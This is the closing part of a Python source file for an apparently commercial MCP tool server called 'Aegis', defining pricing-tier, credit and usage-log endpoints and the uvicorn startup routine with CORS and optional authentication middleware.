        "recent_usage": user_session.usage_log[-10:] if len(user_session.usage_log) > 0 else []
    })

async def pricing_handler(request):
    """Get credit costs for all tools."""
    return JSONResponse({
        "credit_costs": CREDIT_COSTS,
        "tiers": {
            "free": {
                "name": "Free",
                "description": "AI attack tools only",
                "monthly_credits": 1000,
                "tools": TIER_ACCESS["free"]
            },
            "pro": {
                "name": "Pro",
                "description": "All tools except infrastructure",
                "monthly_credits": 5000,
                "tools": len(TIER_ACCESS["pro"])
            },
            "enterprise": {
                "name": "Enterprise",
                "description": "Unlimited access to all tools",
                "monthly_credits": 50000,
                "tools": "all"
            }
        }
    })

async def usage_logs_handler(request):
    """Get detailed usage logs for user."""
    user_session = getattr(request.state, "user_session", None)
    if not user_session:
        return JSONResponse(
            {"error": "Authentication required"},
            status_code=401
        )

    return JSONResponse({
        "user_id": user_session.user_id,
        "total_usage": len(user_session.usage_log),
        "total_credits_spent": sum(log["credits_used"] for log in user_session.usage_log),
        "usage_log": user_session.usage_log
    })

async def run_server():
    """Start HTTP server with authentication middleware."""
    http_app = mcp.streamable_http_app()

    # Add custom routes
    http_app.routes.insert(0, Route("/health", health_handler, methods=["GET"]))
    http_app.routes.insert(1, Route("/credits", credits_handler, methods=["GET"]))
    http_app.routes.insert(2, Route("/pricing", pricing_handler, methods=["GET"]))
    http_app.routes.insert(3, Route("/usage", usage_logs_handler, methods=["GET"]))

    # Add middleware in correct order
    http_app.add_middleware(
        CORSMiddleware,
        allow_origins=["*"],
        allow_methods=["*"],
        allow_headers=["*"]
    )

    # Add authentication middleware
    if REQUIRE_AUTH:
        http_app.add_middleware(AuthMiddleware)
        logger.info("Authentication middleware enabled")
    else:
        logger.warning("Running in development mode - authentication disabled!")

    port = int(os.environ.get("PORT", 8080))
    logger.info(f"Starting Aegis MCP server on port {port}")
    logger.info(f"REQUIRE_AUTH: {REQUIRE_AUTH}")
    logger.info(f"Available tools: {sum(len(tools) for tools in list_capabilities().values())}")

    config = uvicorn.Config(http_app, host="0.0.0.0", port=port, log_level="info")
    await uvicorn.Server(config).serve()

if __name__ == "__main__":
    asyncio.run(run_server())
